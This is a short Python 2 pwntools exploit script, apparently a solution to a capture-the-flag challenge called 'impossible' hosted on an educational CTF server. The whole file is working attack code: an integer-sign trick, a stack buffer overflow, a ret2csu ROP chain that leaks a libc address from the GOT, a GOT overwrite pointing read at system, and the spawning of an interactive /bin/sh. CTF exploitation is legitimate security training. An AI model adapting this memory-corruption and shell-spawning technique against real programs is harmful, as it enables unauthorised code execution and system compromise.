import pwn

p = pwn.remote('eductf.zoolab.org', 10105)
# p= pwn.process('./impossible')
# pwn.gdb.attach('impossible')

puts= 0x4005b0
puts_got=0x601018
read=0x0000000000400803
read_got=0x601028
gets=0
ropchain=[
	pwn.p64(0x0000000000400873),#pop rdi ; ret
	pwn.p64(puts_got),
	pwn.p64(puts),
	pwn.p64(0x000000000040086a),#retcsu
	pwn.p64(0),
	pwn.p64(1),
	pwn.p64(read_got),
	pwn.p64(0),
	pwn.p64(0x601020),
	pwn.p64(20),
	pwn.p64(0x0000000000400850),#csu_start
	pwn.p64(0),
	pwn.p64(0),
	pwn.p64(0),
	pwn.p64(0),
	pwn.p64(0),
	pwn.p64(0),
	pwn.p64(0),
	pwn.p64(0x0000000000400873),#pop rdi ; ret
	pwn.p64(0x601020),#bss
	pwn.p64(read)
]
p.sendlineafter(': ','-2147483648')
p.recvline()
p.recvline()
payload='a'*0x108+''.join(ropchain)
p.sendline(payload)
libc_base=int(p.recv().rstrip('\n')[::-1].encode('hex'),16)-526784
system=(0x7ffff7a33440-0x00007ffff79e4000)+libc_base
print hex(libc_base)
p.sendline('/bin/sh\x00'+pwn.p64(system))
p.interactive()
